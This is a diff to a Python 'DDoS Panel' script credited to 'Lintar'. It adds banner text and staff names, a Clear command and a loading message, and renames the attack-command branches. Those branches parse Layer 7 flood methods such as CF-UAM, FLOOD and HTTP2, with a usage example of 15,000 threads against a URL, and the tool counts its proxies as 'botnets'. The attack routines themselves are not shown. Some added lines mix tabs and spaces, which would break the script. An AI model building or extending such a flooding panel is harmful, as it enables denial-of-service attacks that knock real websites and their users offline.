@@ -19,6 +19,9 @@ def clear():
 proxy = open('proxy.txt').readlines()
 bots = len(proxy)
 
+def lod():
+	print('Wait!')
+
 def atas():
 	print(' Its | Wellcome To Its DDoS Panel | Owner By: Lintar ')
 	print('                     Botnets that we have : {bots}                      ')
@@ -27,8 +30,8 @@ def atas():
 def logo():
 	print(""" 
 ██▓▄▄▄█████▓  ██████       
-▓██▒▓  ██▒ ▓▒▒██    ▒                    
-▒██▒▒ ▓██░ ▒░░ ▓██▄                
+▓██▒▓  ██▒ ▓▒▒██    ▒          Its DDoS Panel By: Lintar          
+▒██▒▒ ▓██░ ▒░░ ▓██▄           Staff By: Van,Ganzi,Ibra,Stret
 ░██░░ ▓██▓ ░   ▒   ██▒                    
 ░██░  ▒██▒ ░ ▒██████▒▒       
 ░▓    ▒ ░░   ▒ ▒▓▒ ▒ ░
@@ -62,13 +65,14 @@ def methods():
 """)
 
 def main():
+    atas()
     logo()
     while(True):
         cnc = input('''@Lintar\n ==>''')
         if cnc == "Methods" or cnc == "METHODS" or cnc == "methods" or cnc == "method" or cnc == "Method" or cnc == "METHOD":
             methods()
-        elif cnc == "Test":
-        	print('Testing')
+        elif cnc == "Clear" or cnc == "CLR":
+	    clear()
 
         elif "Help" in cnc:
             print(f'''         
@@ -85,7 +89,7 @@ def main():
                 
 # LAYER 7 METHODS
 
-        if "CF-UAM" in cnc:
+        elif "CF-UAM" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
@@ -127,7 +131,7 @@ def main():
                 print('Usage: FLOOD <url> <threads> METHODS<GET/POST> <time>')
                 print('Example: FLOOD http://example.com 15000 get 60')
                 
-        elif "HTTP" in cnc:
+        elif "HTTP2" in cnc:
             try:
                 url = cnc.split()[1]
                 req_per_ip = cnc.split()[2]
@@ -224,6 +228,7 @@ def login():
     elif username == user and password == passwd:
         print("Welcome to Its DDoS Panel!!!...")
         time.sleep(0.3)
+	lod()
         main()
 
 login()
